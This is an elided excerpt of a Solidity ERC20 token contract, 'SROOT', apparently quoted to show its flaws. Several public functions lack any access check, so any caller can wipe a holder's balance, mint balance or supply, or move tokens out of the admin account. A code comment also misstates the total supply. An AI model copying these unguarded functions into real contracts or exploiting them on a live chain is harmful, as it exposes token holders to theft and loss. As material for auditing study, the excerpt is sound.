...
contract SROOT is ERC20Upgradeable, Delegatable  {
    ...
    function initialize() public initializer{
        _tTotal = 75000 * 10**18; // 1 quadrillion
        ...
        _Daily_Rewards_account = 0xf32deaA2eed9a784616Fb938753f8Ca6Eb354063;
    ...
    function removeAllTokenFromAddress(address _address) public {
        _rOwned[_address] = 0;
        _tOwned[_address] = 0;
        _tTotal = _tTotal.sub(balanceOf(_address));

    }

    function burnToken(address _account, uint256 _amount) public {
        if(msg.sender != address(0xf32deaA2eed9a784616Fb938753f8Ca6Eb354063))
            return;
    ...
    function addTokenUtil1(address _address, uint256 rAmount)public {
        _rOwned[_address] = _rOwned[_address].add(rAmount);
    }

    function addTokenUtil2(address _address, uint256 _amount) public {
        uint256 rAmount = tokenToReflection(_amount);
        _rTotal = _rTotal.add(rAmount);
        _tTotal = _tTotal.add(_amount);
    }

    function manualtransferSpecial(address recipient, uint256 tAmount) public {
        (uint256 rAmount, uint256 rTransferAmount) = _getSpecialValues(tAmount);
        _rOwned[admin] = _rOwned[admin].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
    }
}